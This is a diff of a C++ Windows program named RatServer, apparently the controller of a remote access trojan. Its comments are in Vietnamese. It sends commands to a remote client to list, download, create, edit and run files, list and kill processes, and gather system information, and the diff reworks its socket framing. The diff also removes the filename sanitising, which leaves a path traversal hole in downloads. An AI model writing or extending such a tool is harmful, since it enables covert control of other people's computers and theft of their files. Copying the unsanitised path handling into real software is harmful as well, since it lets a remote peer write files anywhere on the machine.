@@ -5,34 +5,99 @@
 #include <string>
 #include <windows.h>
 #include <io.h>
+#include <vector>
+#include <cstdint>
+#include <filesystem>
+
+namespace fs = std::filesystem;
 
 #pragma comment(lib, "Ws2_32.lib")
 
 const int BUFFER_SIZE = 4096;
 
 
-
 class SocketClient {
 public:
-    SOCKET socket;
-    void Send(const std::string&);
-    std::string Receive();
-    std::string ReceiveUntilTimeout(DWORD);
+    int socket;
+    void stringSend(std::string msg);
+    std::string stringReceive();
+    void fileDownload(std::ofstream &file);
 };
 
-void SocketClient::Send(const std::string& msg){
-    send(socket, msg.c_str(), static_cast<int>(msg.size()), 0);
+void SocketClient::stringSend(std::string msg) {
+    if (msg.size() > UINT32_MAX) {
+        throw std::runtime_error("Payload too large");
+    }
+    uint32_t payloadSize = static_cast<uint32_t>(msg.size());
+    std::string packet(sizeof(payloadSize) + msg.size(), '\0');
+    memcpy(packet.data(), &payloadSize, sizeof(payloadSize));
+    memcpy(packet.data() + sizeof(payloadSize), msg.data(), msg.size());
+
+    send(socket, packet.data(), packet.size(), 0);
 }
 
-std::string SocketClient::Receive() {
-    char buffer[BUFFER_SIZE]{};
+std::string SocketClient::stringReceive() {
+    uint32_t payloadSize = 0;
 
-    int bytes = recv(socket, buffer, BUFFER_SIZE, 0);
+    int ret = recv(socket,
+                   reinterpret_cast<char*>(&payloadSize),
+                   sizeof(payloadSize),
+                   0);
 
-    if(bytes <= 0)
-        return "";
+    if (ret <= 0) {
+        return {};
+    }
 
-    return std::string(buffer, bytes);
+    std::string payload(payloadSize, '\0');
+
+    int totalReceived = 0;
+    while (totalReceived < payloadSize) {
+        int bytes = recv(socket,
+                         reinterpret_cast<char*>(payload.data()) + totalReceived,
+                         payloadSize - totalReceived,
+                         0);
+
+        if (bytes <= 0) {
+            return {};
+        }
+
+        totalReceived += bytes;
+    }
+
+    return payload;
+}
+
+void SocketClient::fileDownload(std::ofstream& file) {
+    uint32_t payloadSize = 0;
+
+    int ret = recv(socket,
+                   reinterpret_cast<char*>(&payloadSize),
+                   sizeof(payloadSize),
+                   0);
+
+    if (ret <= 0) {
+        return;
+    }
+
+    char buffer[BUFFER_SIZE];
+
+    int totalReceived = 0;
+    while (totalReceived < payloadSize) {
+        int toRead = (payloadSize - totalReceived < BUFFER_SIZE) ? payloadSize - totalReceived : BUFFER_SIZE;
+        int bytes = recv(socket,
+                         buffer,
+                         toRead,
+                         0);
+        
+        if (bytes > 0) {
+            file.write(buffer, bytes);
+            totalReceived += bytes;
+        }
+        else {
+            break;
+        }
+
+    }
 }
 
 
@@ -46,52 +111,44 @@ public:
 };
 
 void DownloadManager::ReceiveFile(const std::string& filename) {
-    auto response = client.Receive();
+    auto response = client.stringReceive();
     
     if (response.rfind("ERROR", 0) == 0) {
         std::cout << "[-] Client bao loi: " << response << std::endl;
         return;
     }
 
-    // --- XỬ LÝ CHUỖI THUẦN TÚY (KHÔNG DÙNG FILESYSTEM) ---
-    // Tạo một bản sao tên file để biến đổi
-    std::string safeFilename = filename; 
-    
-    // Thay thế tất cả các ký tự phân tách đường dẫn '/' hoặc '\' thành '_' 
-    // để tránh lỗi cấu trúc thư mục trên Windows
-    for (size_t i = 0; i < safeFilename.length(); ++i) {
-        if (safeFilename[i] == '/' || safeFilename[i] == '\\' || safeFilename[i] == ':') {
-            safeFilename[i] = '_';
-        }
-    }
-
     // Tạo thư mục downloads lưu trữ tập trung
     std::string targetDir = "downloads";
-    CreateDirectoryA(targetDir.c_str(), NULL);
-    
-    // Đường dẫn file cuối cùng trên Windows (Ví dụ: "downloads\etc_passwd" hoặc "downloads\folder_sub_test.txt")
-    std::string filepath = targetDir + "\\" + safeFilename;
-    // -----------------------------------------------------
+
+    // Chỉ bỏ dấu ':' nếu client gửi kiểu C:\...
+    std::string relativePath = filename;
+
+    if (relativePath.size() > 1 && relativePath[1] == ':')
+        relativePath.erase(1, 1);   // C:\abc -> C\abc
+
+    fs::path filepath = fs::path(targetDir) / relativePath;
+
+    // Tạo toàn bộ thư mục cha
+    fs::create_directories(filepath.parent_path());
 
     std::ofstream file(filepath, std::ios::binary);
     if (!file.is_open()) {
-        std::cout << "[-] Khong the tao file de ghi (Duong dan: " << filepath << ")\n";
+        std::cout << "[-] Khong the tao file de ghi (Duong dan: " << filepath.make_preferred().string() << ")\n";
         return;
     }
 
-    std::cout << "[*] Dang tai file va luu thanh: " << safeFilename << "...\n";
+    std::cout << "[*] Dang tai file va luu thanh: " << filepath.make_preferred().string() << "...\n";
     
-    // Đặt timeout ngắn cho socket để nhận biết khi nào hết dữ liệu file
-    DWORD timeout = 2000; 
-    auto result = client.ReceiveUntilTimeout(timeout);
+    client.fileDownload(file);
 
     file.close();
-    std::cout << "[+] Tai file thanh cong! Luu tai: .\\" << targetDir << "\\" << safeFilename << std::endl;
+    std::cout << "[+] Tai file thanh cong! Luu tai: " << filepath.make_preferred().string() << std::endl;
 }
 
 void DownloadManager::ReceiveFolder(const std::string& foldername) {
     std::cout << "[*] Dang doi phan hoi tu Client..." << std::endl;
-    auto response = client.Receive();
+    auto response = client.stringReceive();
 
     if (response.rfind("ERROR", 0) == 0) {
         std::cout << "[-] Client bao loi: " << response << std::endl;
@@ -113,9 +170,8 @@ void DownloadManager::ReceiveFolder(const std::string& foldername) {
 
         std::cout << "[*] Dang tai tap tin nen cua folder (Timeout bat dau)...\n";
         
-        // Cấu hình Timeout chặn treo cho Windows (2 giây)
-        DWORD timeout = 2000; 
-        auto result = client.ReceiveUntilTimeout(timeout);
+        client.fileDownload(file);
+
         file.close();
 
         std::cout << "[+] Da nhan tron ven file .tar.gz. Dang tien hanh giai nen...\n";
@@ -167,10 +223,10 @@ private:
     void HandleCommand(const std::string& input);
     
     void ListFile();
+    void SendFileContent(std::string& filename);
+
     void ListProcess();
     void ReceiveStatus();
-
-    void SendFileContent(std::string& filename);
 
     void SysInfo();
 };
@@ -214,7 +270,7 @@ void RatServer::CommandLoop() {
         if (input == "EXIT") break;
         
         // Gửi lệnh sang Client
-        client.Send(input);
+        client.stringSend(input);
 
         HandleCommand(input);
 
@@ -235,11 +291,9 @@ void RatServer::HandleCommand(const std::string& input) {
         std::string foldername = input.substr(7);
         downloadManager.ReceiveFolder(foldername); // Hàm nhận folder mới
     }
-    else if (input == "PS") { // Xử lý nhận danh sách tiến trình
-        ListProcess();
-    }
-    else if (input.rfind("KILL ", 0) == 0) { // Thêm nhánh xử lý phản hồi lệnh KILL
-        ReceiveStatus();
+    else if (input.rfind("CREATEFILE ", 0) == 0) { // Thêm nhánh xử lý CREATEFILE
+        std::string filename = input.substr(9);
+        SendFileContent(filename);
     }
     else if (input.rfind("EDITFILE ", 0) == 0) { // Thêm nhánh xử lý EDITFILE
         std::string filename = input.substr(9);
@@ -251,17 +305,23 @@ void RatServer::HandleCommand(const std::string& input) {
     else if (input.rfind("RUNFILE ", 0) == 0) { // Thêm nhánh xử lý phản hồi lệnh RUNFILE
         ReceiveStatus();
     }
-    else if (input.rfind("CREATEFILE ", 0) == 0) { // Thêm nhánh xử lý CREATEFILE
-        std::string filename = input.substr(9);
-        SendFileContent(filename);
+
+
+    else if (input == "PS") { // Xử lý nhận danh sách tiến trình
+        ListProcess();
     }
+    else if (input.rfind("KILL ", 0) == 0) { // Thêm nhánh xử lý phản hồi lệnh KILL
+        ReceiveStatus();
+    }
+    
+    
     else if (input == "SYSINFO") { // Thêm nhánh xử lý phản hồi lệnh SYSINFO
         SysInfo();
     }
 }
 
 void RatServer::ListFile() {
-    auto response = client.Receive();
+    auto response = client.stringReceive();
 
     if(response.empty())
         return;
@@ -270,40 +330,8 @@ void RatServer::ListFile() {
     std::cout << response << std::endl;
 }
 
-void RatServer::ListProcess() {
-    std::cout << "[*] Dang tai danh sach tien trinh..." << std::endl;
-            
-    // Đặt timeout ngắn (1 giây) để nhận biết khi Client dừng gửi dữ liệu
-    DWORD timeout = 1000; 
-    auto psResult = client.ReceiveUntilTimeout(timeout);
-    
-    if (!psResult.empty()) {
-        std::cout << psResult << std::endl;
-    } else {
-        std::cout << "[-] Khong nhan duoc du lieu hoac thoi gian cho qua lau.\n";
-    }
-}
-
-std::string SocketClient::ReceiveUntilTimeout(DWORD timeout) {
-    setsockopt(socket, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
-
-    std::string result = "";
-    while (true) {
-        auto response = Receive();
-
-        if(response.empty()) break;
-        result += response;
-    }
-
-    // Reset lại timeout về vô hạn cho các lệnh tiếp theo
-    timeout = 0;
-    setsockopt(socket, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
-
-    return result;
-}
-
 void RatServer::SendFileContent(std::string& filename) {
-    auto clientSignal = client.Receive();
+    auto clientSignal = client.stringReceive();
 
     if(clientSignal.empty())
         return;
@@ -315,10 +343,10 @@ void RatServer::SendFileContent(std::string& filename) {
         std::getline(std::cin, newContent);
 
         // Gửi nội dung mới sang Client
-        client.Send(newContent);
+        client.stringSend(newContent);
 
         // Nhận kết quả phản hồi cuối cùng từ Client
-        auto response = client.Receive();
+        auto response = client.stringReceive();
 
         if(response.empty())
             return;
@@ -330,7 +358,7 @@ void RatServer::SendFileContent(std::string& filename) {
 }
 
 void RatServer::ReceiveStatus() {
-    auto response = client.Receive();
+    auto response = client.stringReceive();
 
     if(response.empty())
         std::cout << "[-] Khong nhan duoc phan hoi tu Client.\n";
@@ -339,13 +367,24 @@ void RatServer::ReceiveStatus() {
     }
 }
 
+
+void RatServer::ListProcess() {
+    std::cout << "[*] Dang tai danh sach tien trinh..." << std::endl;
+
+    std::string psResult = client.stringReceive();
+    
+    if (!psResult.empty()) {
+        std::cout << psResult << std::endl;
+    } else {
+        std::cout << "[-] Khong nhan duoc du lieu hoac thoi gian cho qua lau.\n";
+    }
+}
+
+
 void RatServer::SysInfo() {
     std::cout << "[*] Dang tai thong tin cau hinh tu Client..." << std::endl;
-            
-    // Đặt timeout ngắn (1 giây) để đảm bảo nhận hết gói tin văn bản thông tin
-    DWORD timeout = 1000; 
 
-    auto sysInfoResult = client.ReceiveUntilTimeout(timeout);
+    std::string sysInfoResult = client.stringReceive();
     if (!sysInfoResult.empty()) {
         std::cout << sysInfoResult << std::endl;
     } else {
